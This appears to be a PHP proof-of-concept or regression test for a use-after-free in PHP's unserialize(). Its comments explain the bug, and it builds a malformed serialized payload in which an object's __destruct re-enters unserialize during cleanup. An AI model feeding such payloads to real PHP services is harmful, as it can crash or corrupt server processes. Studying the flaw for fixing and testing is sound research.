<?php
// vd4: trigger via the __wakeup DELAYED-CALL slot instead of duplicate keys.
// Object with __wakeup AND __destruct gets a VAR_WAKEUP_FLAG dtor slot
// (var_unserializer.re:898). Trailing decode error -> tree freed pre-destroy
// -> slot is the last ref. In var_destroy: __wakeup runs BRACKETED
// (serialize_lock++), but the following i_zval_ptr_dtor(zv) is UNBRACKETED
// -> __destruct fires inside the walk -> re-entrant unserialize reuses the
// mid-destroy context -> var_push on the freed entries chain.
class W {
    public function __wakeup() { }
    public function __destruct() { unserialize('i:7;'); }
}
$els = [];
for ($k = 0; $k <= 1016; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:1:"W":1:{s:1:"a";i:1;}';   // object with __wakeup -> flagged slot
$payload = 'a:1018:{' . implode('', $els);     // missing closing brace -> decode error
$r = @unserialize($payload);
echo "outer returned ";
var_dump($r === false);
echo "SURVIVED\n";
